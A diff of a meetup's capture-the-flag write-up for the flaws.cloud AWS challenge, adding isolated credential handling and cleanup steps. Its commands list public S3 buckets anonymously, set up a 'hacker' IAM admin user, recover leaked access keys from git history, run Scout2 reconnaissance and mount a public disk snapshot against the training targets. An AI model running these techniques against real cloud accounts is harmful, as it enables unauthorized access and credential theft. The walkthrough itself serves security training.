@@ -249,7 +249,8 @@
 <h2>3.2.1. flaws.cloud AWS challenge<a class="headerlink" href="#flaws-cloud-aws-challenge" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="the-challenge">
 <h3>3.2.1.1. The challenge<a class="headerlink" href="#the-challenge" title="Permalink to this headline">¶</a></h3>
-<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="http://flaws.cloud/">flaws</a>. For other writeups see <a class="reference external" href="https://github.com/mzet-/ctf-writeups/blob/master/flaws.cloud/flaws.cloud.md">mzet-/ctf-writeups - flaws.cloud</a> (concise and uses <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>) along with <a class="reference external" href="https://gist.github.com/dboyd13/ba106b92ad6b795100b766f7c86e532f">dboyd13/flaws.cloud.md</a>.</p>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="http://flaws.cloud/">flaws</a>, including some AWS background material making the challenge easier to understand.</p>
+<p>For other writeups see <a class="reference external" href="https://github.com/mzet-/ctf-writeups/blob/master/flaws.cloud/flaws.cloud.md">mzet-/ctf-writeups - flaws.cloud</a> (concise and uses <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>) along with <a class="reference external" href="https://gist.github.com/dboyd13/ba106b92ad6b795100b766f7c86e532f">dboyd13/flaws.cloud.md</a>.</p>
 </div>
 <div class="section" id="the-aws-vulnerabilities">
 <h3>3.2.1.2. The AWS vulnerabilities<a class="headerlink" href="#the-aws-vulnerabilities" title="Permalink to this headline">¶</a></h3>
@@ -283,7 +284,7 @@
 </pre></div>
 </div>
 <p>Note that this only supports s3:GetObject and not the complete list of <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/list_amazons3.html">AWS IAM - Actions, Resources, and Condition Keys for Amazon S3</a>, especially not s3:ListBucket (list bucket contents). But AWS S3 buckets can be misconfigured to allow access from one of the Amazon S3 Predefined Groups in <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html">Amazon S3 - Access Control List (ACL) Overview</a>, specifically AllUsers (including anonymous or unauthenticated principals) or AuthenticatedUsers (any user with some AWS account). Note that ACLs are but one way to set permissions: see <a class="reference external" href="https://aws.amazon.com/blogs/security/iam-policies-and-bucket-policies-and-acls-oh-my-controlling-access-to-s3-resources/">IAM Policies and Bucket Policies and ACLs! Oh, My! (Controlling Access to S3 Resources)</a>.</p>
-<p>AWS uses REST requests (see <a class="reference external" href="https://en.wikipedia.org/wiki/Representational_state_transfer">Representational state transfer</a>). They are authenticated by <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html">Signing AWS API Requests</a> using AWS account access keys consisting of a 20-character access key ID and a 40-character secret access key. (For more detail see <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/MakingRequests.html">Amazon S3 - Making Requests</a>, <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html">AWS S3 - Signing and Authenticating REST Requests</a>, <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html">AWS S3 - Authenticating Requests (AWS Signature Version 4)</a>, for actual Python code <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html">AWS - Examples of the Complete Version 4 Signing Process (Python)</a>.)</p>
+<p>AWS uses REST requests (see <a class="reference external" href="https://en.wikipedia.org/wiki/Representational_state_transfer">Representational state transfer</a>). They are authenticated by <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html">Signing AWS API Requests</a> using AWS account access keys consisting of a 20-character access key ID and a 40-character secret access key. (For more detail see <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/MakingRequests.html">Amazon S3 - Making Requests</a>, <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html">AWS S3 - Signing and Authenticating REST Requests</a>, <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html">AWS S3 - Authenticating Requests (AWS Signature Version 4)</a>, and for actual Python code <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html">AWS - Examples of the Complete Version 4 Signing Process (Python)</a>.)</p>
 <p>To make an unauthenticated (unsigned) request (as AllUsers) use <code class="docutils literal notranslate"><span class="pre">aws</span> <span class="pre">--no-sign-request</span> <span class="pre">...</span></code>. To make an authenticated request (as AuthenticatedUsers) use a temporary AWS account and IAM user not tied to any personal account.</p>
 </div>
 <div class="section" id="where-s-the-level-1-website-hosted">
@@ -300,12 +301,15 @@
 <div class="section" id="anonymous-aws-s3-bucket-access">
 <h3>3.2.2.3. Anonymous AWS S3 bucket access<a class="headerlink" href="#anonymous-aws-s3-bucket-access" title="Permalink to this headline">¶</a></h3>
 <p>Test for anonymous (AllUsers) s3:ListBucket access to bucket flaws.cloud:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+</span><span class="hll">rm -rf <span class="nv">$WORKDIR</span> <span class="o">&amp;&amp;</span> mkdir -p <span class="nv">$WORKDIR</span> <span class="o">&amp;&amp;</span> <span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+</span>
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
   <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
-<span class="c1"># --no-sign-request doesn&#39;t sign the request (credentials not used)</span>
-<span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> <span class="se">\</span>
+<span class="hll"><span class="c1"># --no-sign-request doesn&#39;t sign the request (credentials not used)</span>
+</span><span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> <span class="se">\</span>
 </span><span class="hll">  s3 ls s3://<span class="nv">$D</span>/
 </span><span class="hll"><span class="c1"># Output includes: secret-dd02c7c.html</span>
 </span><span class="hll">aws --no-sign-request --region <span class="nv">$REGION</span> <span class="se">\</span>
@@ -321,19 +325,23 @@
 <h2>3.2.3. <a class="reference external" href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/">flaws.cloud Level 2</a><a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="level-2-aws-background">
 <h3>3.2.3.1. Level 2 AWS background<a class="headerlink" href="#level-2-aws-background" title="Permalink to this headline">¶</a></h3>
-<p>Use an <a class="reference external" href="https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/">AWS Free Tier</a> account for stealth (though not necessary for flaws.cloud). Here’s the AWS CLI to add/delete an IAM administrative user:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">HACKER</span><span class="o">=</span>hacker
+<p>We’re going to pretent you are using an <a class="reference external" href="https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/">AWS Free Tier</a> account for stealth (though this is not necessary for flaws.cloud) and will create a hacker IAM account for exploit use. Our goal is to make it easy to only use this IAM account or other compromised credentials (and not your other AWS credentials). We’ll do this by setting the environment variables <span class="target" id="index-0"></span><code class="xref std std-envvar docutils literal notranslate"><span class="pre">AWS_SHARED_CREDENTIALS_FILE</span></code> and <span class="target" id="index-1"></span><code class="xref std std-envvar docutils literal notranslate"><span class="pre">AWS_CONFIG_FILE</span></code> to a <span class="target" id="index-2"></span><code class="xref std std-envvar docutils literal notranslate"><span class="pre">WORKDIR</span></code> instead of the default <code class="file docutils literal notranslate"><span class="pre">~/.aws/credentials</span></code> and <code class="file docutils literal notranslate"><span class="pre">~/.aws/config</span></code>, respectively. That way we can only use an account intended for this exploit, and cleaning up afterward is just deleting those files. See <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/userguide/cli-environment.html">AWS CLI - Environment Variables</a> and <a class="reference external" href="https://docs.aws.amazon.com/cli/latest/topic/config-vars.html">AWS CLI - Configuration Variables</a> for details.</p>
+<p>Here’s the AWS CLI to add/delete an IAM administrative user <em>hacker</em> for this exploit:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+
+<span class="nv">HACKER</span><span class="o">=</span>hacker
 <span class="nv">HACKERGROUP</span><span class="o">=</span>Administrators
 <span class="nv">PASSWORD</span><span class="o">=</span><span class="s1">&#39;PleaseChangeMeS00n!&#39;</span><span class="nv">$RANDOM$RANDOM</span>
 
-<span class="hll"><span class="c1"># create user</span>
+<span class="hll"><span class="c1"># create additional IAM user in the temp AWS account</span>
 </span>aws iam create-user --user-name <span class="nv">$HACKER</span> --output json <span class="p">|</span> tee <span class="nv">$HACKER</span>-create.json
 chmod <span class="m">600</span> <span class="nv">$HACKER</span>-create.json
 
-<span class="hll"><span class="c1"># access to the AWS Management Console</span>
+<span class="hll"><span class="c1"># access to the AWS Management Console - we don&#39;t use this</span>
 </span>aws iam create-login-profile --user <span class="nv">$HACKER</span> --password <span class="nv">$PASSWORD</span> --no-password-reset-required
 
-<span class="hll"><span class="c1"># programmatic access</span>
+<span class="hll"><span class="c1"># programmatic access - we only use this</span>
 </span>aws iam create-access-key --user-name <span class="nv">$HACKER</span> --output json <span class="p">|</span> tee <span class="nv">$HACKER</span>-keys.json
 chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
 <span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AccessKey.AccessKeyId&#39;</span> <span class="nv">$HACKER</span>-keys.json<span class="k">)</span>
@@ -342,11 +350,16 @@ chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
 <span class="hll"><span class="c1"># add user to group</span>
 </span>aws iam add-user-to-group --user-name <span class="nv">$HACKER</span> --group-name <span class="nv">$HACKERGROUP</span>
 
-<span class="hll"><span class="c1"># set up profile</span>
-</span>cat <span class="s">&lt;&lt;EOF | aws configure --profile $HACKER</span>
+<span class="hll"><span class="c1"># set up &amp; switch new profile files - switch profile location for hacking</span>
+</span><span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+touch <span class="nv">$AWS_CONFIG_FILE</span> <span class="o">&amp;&amp;</span> chmod <span class="m">600</span> <span class="nv">$AWS_CONFIG_FILE</span>
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+touch <span class="nv">$AWS_SHARED_CREDENTIALS_FILE</span> <span class="o">&amp;&amp;</span> chmod <span class="m">600</span> <span class="nv">$AWS_SHARED_CREDENTIALS_FILE</span>
+
+cat <span class="s">&lt;&lt;EOF | aws configure --profile $HACKER</span>
 <span class="s">$AK</span>
 <span class="s">$SAK</span>
-<span class="s">$REGION</span>
+<span class="s">us-west-2</span>
 <span class="s">json</span>
 <span class="s">EOF</span>
 
@@ -355,29 +368,44 @@ chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
 </pre></div>
 </div>
 <p id="flaws-delete-user">The corresponding code to delete the user is:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># *********************</span>
-<span class="hll"><span class="c1"># when done delete user</span>
-</span><span class="c1"># *********************</span>
-<span class="nv">HACKER</span><span class="o">=</span>hacker
-<span class="hll">aws iam delete-login-profile --user-name <span class="nv">$HACKER</span>
-</span><span class="hll"><span class="nv">GS</span><span class="o">=</span><span class="k">$(</span>aws iam list-groups-for-user --user-name <span class="nv">$HACKER</span> --output text <span class="se">\</span>
-</span><span class="hll">       --query <span class="s1">&#39;Groups[].GroupName&#39;</span><span class="k">)</span>
-</span><span class="hll"><span class="k">for</span> G in <span class="nv">$GS</span><span class="p">;</span> <span class="k">do</span>
-</span><span class="hll">  aws iam remove-user-from-group --group-name <span class="nv">$G</span>  --user-name <span class="nv">$HACKER</span>
-</span><span class="hll"><span class="k">done</span>
-</span><span class="hll"><span class="nv">KS</span><span class="o">=</span><span class="k">$(</span>aws iam list-access-keys --user-name <span class="nv">$HACKER</span> --output text <span class="se">\</span>
-</span><span class="hll">       --query <span class="s1">&#39;AccessKeyMetadata[].AccessKeyId&#39;</span><span class="k">)</span>
-</span><span class="hll"><span class="k">for</span> K in <span class="nv">$KS</span><span class="p">;</span> <span class="k">do</span>
-</span><span class="hll">  aws iam delete-access-key --user-name <span class="nv">$HACKER</span> --access-key-id <span class="nv">$K</span>
-</span><span class="hll"><span class="k">done</span>
-</span><span class="hll">aws iam delete-user --user-name <span class="nv">$HACKER</span>
-</span></pre></div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># *********************************************************</span>
+<span class="hll"><span class="c1"># When done delete user.</span>
+</span><span class="c1"># NOTE - this assumes you use the default profile location.</span>
+<span class="c1"># *********************************************************</span>
+<span class="hll"><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+</span><span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+
+<span class="hll"><span class="c1"># Delete all SSH keypairs</span>
+</span>rm -f <span class="nv">$WORKDIR</span>/*.pem
+
+<span class="hll"><span class="c1"># Delete config, credential files</span>
+</span>rm -f <span class="nv">$AWS_SHARED_CREDENTIALS_FILE</span> <span class="nv">$AWS_CONFIG_FILE</span>
+<span class="nb">unset</span> AWS_SHARED_CREDENTIALS_FILE AWS_CONFIG_FILE
+
+<span class="hll"><span class="c1"># Delete IAM user</span>
+</span><span class="nv">HACKER</span><span class="o">=</span>hacker
+aws iam delete-login-profile --user-name <span class="nv">$HACKER</span>
+<span class="nv">GS</span><span class="o">=</span><span class="k">$(</span>aws iam list-groups-for-user --user-name <span class="nv">$HACKER</span> --output text <span class="se">\</span>
+       --query <span class="s1">&#39;Groups[].GroupName&#39;</span><span class="k">)</span>
+<span class="k">for</span> G in <span class="nv">$GS</span><span class="p">;</span> <span class="k">do</span>
+  aws iam remove-user-from-group --group-name <span class="nv">$G</span>  --user-name <span class="nv">$HACKER</span>
+<span class="k">done</span>
+<span class="nv">KS</span><span class="o">=</span><span class="k">$(</span>aws iam list-access-keys --user-name <span class="nv">$HACKER</span> --output text <span class="se">\</span>
+       --query <span class="s1">&#39;AccessKeyMetadata[].AccessKeyId&#39;</span><span class="k">)</span>
+<span class="k">for</span> K in <span class="nv">$KS</span><span class="p">;</span> <span class="k">do</span>
+  aws iam delete-access-key --user-name <span class="nv">$HACKER</span> --access-key-id <span class="nv">$K</span>
+<span class="k">done</span>
+aws iam delete-user --user-name <span class="nv">$HACKER</span>
+</pre></div>
 </div>
 </div>
 <div class="section" id="allusers-bucket-access-fails">
 <h3>3.2.3.2. AllUsers bucket access fails<a class="headerlink" href="#allusers-bucket-access-fails" title="Permalink to this headline">¶</a></h3>
 <p>Accessing the Level 2 bucket <em>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</em> without signing fails:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
   <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
@@ -390,7 +418,12 @@ chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
 <div class="section" id="authenticatedusers-bucket-access-succeeds">
 <h3>3.2.3.3. AuthenticatedUsers bucket access succeeds<a class="headerlink" href="#authenticatedusers-bucket-access-succeeds" title="Permalink to this headline">¶</a></h3>
 <p>From <a class="reference external" href="https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html">Amazon S3 - Access Control List (ACL) Overview</a> <em>Amazon S3 Predefined Groups</em>, permissions are not set using the AllUsers group. But perhaps it uses the AuthenticatedUsers group (any principal with an AWS account). To check out create a throw-away user (following the code above) then:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">HACKER</span><span class="o">=</span>hacker
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">HACKER</span><span class="o">=</span>hacker
 <span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span> <span class="p">|</span> tail -n <span class="m">1</span><span class="k">)</span> <span class="se">\</span>
@@ -421,7 +454,7 @@ chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
 <p>Not useful in this context, but useful for study of policy content.</p>
 </li>
 <li><p class="first"><a class="reference external" href="https://github.com/nccgroup/Scout2">AWS Scout2</a></p>
-<p>Scout2 is a security tool that lets AWS administrators assess their environment’s security posture. It produces an html report.  Needed permissions are AWS Managed Policies ReadOnlyAccess and SecurityAudit, though interesting results are possible without those permissions. See <a class="reference external" href="https://github.com/nccgroup/Scout2/wiki">AWS Scout2 Wiki</a> for more information.</p>
+<p><code class="docutils literal notranslate"><span class="pre">Scout2</span></code> is a security tool that lets AWS administrators assess their environment’s security posture. It produces an html report.  Needed permissions are AWS Managed Policies ReadOnlyAccess and SecurityAudit, though interesting results are possible without those permissions. See <a class="reference external" href="https://github.com/nccgroup/Scout2/wiki">AWS Scout2 Wiki</a> for more information.</p>
 </li>
 </ul>
 </div>
@@ -439,7 +472,10 @@ chmod <span class="m">600</span> <span class="nv">$HACKER</span>-keys.json
 <div class="section" id="allusers-bucket-access">
 <h3>3.2.4.2. AllUsers bucket access<a class="headerlink" href="#allusers-bucket-access" title="Permalink to this headline">¶</a></h3>
 <p>Access the level 3 bucket as AllUsers:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+
+<span class="nv">LEVEL3</span><span class="o">=</span>level3
 <span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
@@ -458,13 +494,23 @@ mkdir -p <span class="nv">$LEVEL3</span>-repo/.git
 <div class="section" id="analyze-the-git-repo">
 <h3>3.2.4.3. Analyze the git repo<a class="headerlink" href="#analyze-the-git-repo" title="Permalink to this headline">¶</a></h3>
 <p>Git repositories have been a historical source of leaked credentials:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+
+<span class="nv">LEVEL3</span><span class="o">=</span>level3
 <span class="nb">cd</span> <span class="nv">$LEVEL3</span>-repo
 <span class="hll">git log
 </span><span class="hll"><span class="c1"># Output includes: Oops, accidentally added something I shouldn&#39;t have</span>
 </span><span class="hll"><span class="c1"># Output includes: commit f52ec03b227ea6094b04e43f475fb0126edb5a61</span>
-</span><span class="hll">
-</span><span class="hll">git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+</span>
+<span class="hll">git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
 </span><span class="hll">ls
 </span><span class="hll"><span class="c1"># Output: access_keys.txt</span>
 </span><span class="hll">cat access_keys.txt
@@ -496,7 +542,10 @@ mkdir -p <span class="nv">$LEVEL3</span>-repo/.git
 </span></pre></div>
 </div>
 <p>Use Truffle Hog for an alternative approach to finding the Git credentials:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+
+<span class="nv">LEVEL3</span><span class="o">=</span>level3
 
 pip install -U truffleHog
 <span class="hll">trufflehog --regex --entropy<span class="o">=</span>False <span class="nv">$LEVEL3</span>-repo
@@ -527,15 +576,30 @@ pip install -U truffleHog
 <div class="section" id="audit-the-compromised-keys">
 <h3>3.2.4.4. Audit the compromised keys<a class="headerlink" href="#audit-the-compromised-keys" title="Permalink to this headline">¶</a></h3>
 <p>The goal is to collect information from <a class="reference external" href="https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html">AWS Security Audit Guidelines</a> with user <em>backup</em>. Here use <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">LEVEL3</span><span class="o">=</span>level3
 <span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
 <span class="nv">D</span><span class="o">=</span>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
 <span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
   <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
 
 pip install -U awsscout2
+<span class="hll"><span class="c1"># Scout2 ignores AWS_CONFIG_FILE and AWS_SHARED_CREDENTIALS_FILE</span>
+</span><span class="o">(</span>
+  <span class="nb">cd</span> ~/.aws <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  mv config config.bak <span class="o">&amp;&amp;</span> cp <span class="nv">$AWS_CONFIG_FILE</span> config <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  mv credentials credentials.bak <span class="o">&amp;&amp;</span> cp <span class="nv">$AWS_SHARED_CREDENTIALS_FILE</span> credentials
+<span class="o">)</span>
 <span class="hll">Scout2 --profile <span class="nv">$LEVEL3</span> --region <span class="nv">$REGION</span> --report-dir scout2-<span class="nv">$LEVEL3</span>
-</span><span class="c1"># Directory scout2-$LEVEL3 contains HTML report:</span>
+</span><span class="o">(</span>
+   <span class="nb">cd</span> ~/.aws <span class="o">&amp;&amp;</span> <span class="se">\</span>
+   mv config.bak config <span class="o">&amp;&amp;</span> mv credentials.bak credentials
+<span class="o">)</span>
+<span class="c1"># Directory scout2-$LEVEL3 contains HTML report:</span>
 <span class="hll"><span class="o">(</span><span class="nb">cd</span> scout2-<span class="nv">$LEVEL3</span><span class="p">;</span> python3 -m http.server <span class="m">8080</span><span class="o">)</span>
 </span><span class="hll"><span class="c1"># Browse report ...</span>
 </span>
@@ -547,8 +611,8 @@ pip install -U awsscout2
 <span class="c1">#   cloudformation cloudtrail cloudwatch directconnect</span>
 <span class="c1">#   ec2 efs elasticache elb elbv2 emr iam awslambda</span>
 <span class="c1">#   redshift rds route53 route53domains s3 ses sns sqs vpc</span>
-<span class="c1"># only ec2 and vpc show interesting results:</span>
-<span class="hll"><span class="k">for</span> SERVICE in ec2 vpc<span class="p">;</span> <span class="k">do</span>
+<span class="hll"><span class="c1"># only ec2 and vpc show interesting results:</span>
+</span><span class="hll"><span class="k">for</span> SERVICE in ec2 vpc<span class="p">;</span> <span class="k">do</span>
 </span><span class="hll">  jq <span class="s1">&#39;.services.&#39;</span><span class="nv">$SERVICE</span><span class="s1">&#39;.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;]&#39;</span> <span class="nv">$LEVEL3</span>-scout2.json <span class="p">|</span> tee <span class="nv">$LEVEL3</span>-service-<span class="nv">$SERVICE</span>.json
 </span><span class="hll"><span class="k">done</span>
 </span><span class="hll"><span class="c1"># NOTE: Scout2 shows no buckets</span>
@@ -591,8 +655,13 @@ jq <span class="s1">&#39;.services.ec2.regions[&quot;&#39;</span><span class="nv
 </div>
 <div class="section" id="exploit-public-snapshot">
 <h3>3.2.5.3. Exploit public snapshot<a class="headerlink" href="#exploit-public-snapshot" title="Permalink to this headline">¶</a></h3>
-<p>Level 3 left us with <em>backup</em>’s credentials and reconnaisance results from <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>. Prominent among those results is there is 1 EC2 instance with 1 snapshot of it’s disk volume. One way to exploit the snapshot is: restore the snapshot to a volume, mount the volume on an EC2 instance, then explore the volume for exploit potentials. Level 3 credentials are required to recon that snapshot, your hacker account creates the EC2 instance using the public snapshot.</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL3</span><span class="o">=</span>level3
+<p>Level 3 left us with <em>backup</em>’s credentials and reconnaisance results from <code class="docutils literal notranslate"><span class="pre">Scout2</span></code>. Prominent among those results is there is 1 EC2 instance with 1 snapshot of it’s disk volume. One way to exploit the snapshot is: restore the snapshot to a volume, mount the volume on an EC2 instance, then explore the volume for exploit potentials. Note the careful use of credentials: Level 3 credentials are required to recon that snapshot, while your hacker account creates the EC2 instance using the public snapshot.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">WORKDIR</span><span class="o">=</span><span class="nv">$HOME</span>/exploits/flaws
+<span class="nb">cd</span> <span class="nv">$WORKDIR</span>
+<span class="nb">export</span> <span class="nv">AWS_CONFIG_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.config
+<span class="nb">export</span> <span class="nv">AWS_SHARED_CREDENTIALS_FILE</span><span class="o">=</span><span class="nv">$WORKDIR</span>/.credentials
+
+<span class="nv">LEVEL3</span><span class="o">=</span>level3
 <span class="nv">LEVEL4</span><span class="o">=</span>level4
 <span class="nv">HACKER</span><span class="o">=</span>hacker
 <span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
@@ -697,24 +766,25 @@ chmod <span class="m">600</span> <span class="nv">$KEYNAME</span>.pem
 <blockquote>
 <div>Good work getting in. This level is described at <a class="reference external" href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a></div></blockquote>
 <p id="flaws-delete-instance">To clean up the created EC2 resources:</p>
